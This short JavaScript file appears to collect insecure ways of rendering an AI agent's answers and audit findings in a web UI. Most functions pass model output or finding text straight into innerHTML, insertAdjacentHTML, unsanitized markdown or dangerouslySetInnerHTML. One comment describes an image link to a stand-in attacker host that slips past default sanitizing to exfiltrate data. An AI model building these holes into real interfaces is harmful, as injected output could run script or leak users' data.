// Renders the agent's answer and the audit findings in the auditor UI.
async function showReview(resp) {
  const data = await resp.json();
  const out = document.getElementById("out");
  // model answer rendered as raw HTML
  out.innerHTML = `<h3>${data.title}</h3><div class="verdict">${data.verdict}</div><p>${data.rationale}</p>`;
}

function renderFinding(finding) {
  const row = document.createElement("tr");
  row.innerHTML = "<td>" + finding.description + "</td><td>" + finding.recommendation + "</td>";
  return row;
}

function streamMarkdown(rawMarkdown) {
  const output = document.getElementById("output");
  // default DOMPurify config keeps remote <img src=https://attacker/?q=...>
  output.innerHTML = DOMPurify.sanitize(marked.parse(rawMarkdown));
}

function plainMarkdown(answer) {
  document.getElementById("answer").innerHTML = marked.parse(answer);
}

function addNote(list, note) {
  list.insertAdjacentHTML("beforeend", `<li>${note.text}</li>`);
}

function Answer({ reply }) {
  return <div dangerouslySetInnerHTML={{ __html: reply.content }} />;
}
